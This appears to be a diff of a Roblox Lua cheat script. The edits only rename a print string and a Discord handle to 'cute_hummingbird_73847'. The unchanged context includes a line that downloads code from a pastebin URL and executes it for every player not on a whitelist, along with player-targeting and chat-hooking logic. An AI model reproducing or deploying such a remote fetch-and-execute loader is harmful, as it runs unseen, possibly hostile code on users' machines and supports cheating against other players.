@@ -1,5 +1,5 @@
 if game.Players.LocalPlayer.Name == "zer1ckq" then
-    print("DEER")
+    print("cute_hummingbird_73847")
 else
     loadstring(game:HttpGet('https://pastebin.com/raw/3hnKWdzB'))()
 end 
@@ -489,7 +489,7 @@ game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.bar.Ba
 game.StarterGui:SetCore("SendNotification", {
     Title = "Stop using my script"; 
     Text = "script dew";
-    Text = "discrod deer14927";
+    Text = "discrod cute_hummingbird_73847";
     Icon = "rbxassetid://16005965106";
     Duration = 60;
     })
@@ -6041,7 +6041,7 @@ end
 
 local targetNames = {"isthisdo23", "cruciatusadidas", "RKLWPGZLG", "zer1ckq","dahoodbotmoney5"}
 if table.find(targetNames, game.Players.LocalPlayer.Name) then
-    print("DEER")
+    print("cute_hummingbird_73847")
 else
     function PoorCharacter(targetPlayer)
     targetPlayer.Chatted:Connect(function(msg)
